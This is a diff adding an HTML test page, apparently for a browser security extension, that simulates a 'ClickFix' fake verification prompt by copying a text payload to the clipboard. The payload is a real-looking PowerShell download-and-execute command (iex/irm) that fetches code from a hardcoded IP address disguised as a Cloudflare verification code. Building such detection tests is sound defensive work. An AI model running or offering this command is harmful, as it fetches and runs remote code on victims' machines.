@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Sekant Simulated Test - ClickFix Payload</title>
+  <script src="../guard.js"></script>
+</head>
+<body style="font-family: ui-sans-serif, system-ui, sans-serif; margin: 40px; line-height: 1.5;">
+  <div style="background: #b02a1e; color: #fff; font-size: 0.85rem; padding: 0.6rem 1rem; border-radius: 6px; max-width: 480px; margin-bottom: 1.5rem;">
+    ⚠ SIMULATED TEST - this does not run any code on your device.
+    <a href="../index.html" style="color: #fff;">Back to test list</a>
+  </div>
+
+  <h2>ClickFix simulated test</h2>
+  <p>Simulates a fake "verification" prompt. Clicking the button copies a harmless-looking text payload to your
+     clipboard (fires the real <code>copy</code> event so the extension's clipboard hook runs). Nothing is executed -
+     it is text only.</p>
+
+  <textarea id="payload" readonly style="width: 92%; height: 96px; font-family: ui-monospace, monospace; font-size: 13px;"></textarea>
+  <br /><br />
+  <button id="copyBtn" type="button" style="font-size: 15px; padding: 10px 18px;">
+    Copy verification code (simulated payload)
+  </button>
+  <p id="status" style="color: #555;"></p>
+
+  <script>
+    const payload = 'powershell -c "iex(irm \'85.239.149.16/CloudFlare_Verification_Code_845270\' -UseBasicParsing)"';
+    document.getElementById("payload").value = payload;
+
+    document.getElementById("copyBtn").addEventListener("click", async () => {
+      const status = document.getElementById("status");
+      try {
+        if (navigator.clipboard?.writeText) {
+          await navigator.clipboard.writeText(payload);
+          status.textContent = "Copied to clipboard (text only - nothing was executed).";
+        } else {
+          const ta = document.getElementById("payload");
+          ta.focus();
+          ta.select();
+          ta.setSelectionRange(0, ta.value.length);
+          document.execCommand("copy");
+          status.textContent = "clipboard API unavailable; execCommand copy fallback.";
+        }
+      } catch (e) {
+        status.textContent = "writeText failed: " + e.message;
+      }
+    });
+  </script>
+</body>
+</html>
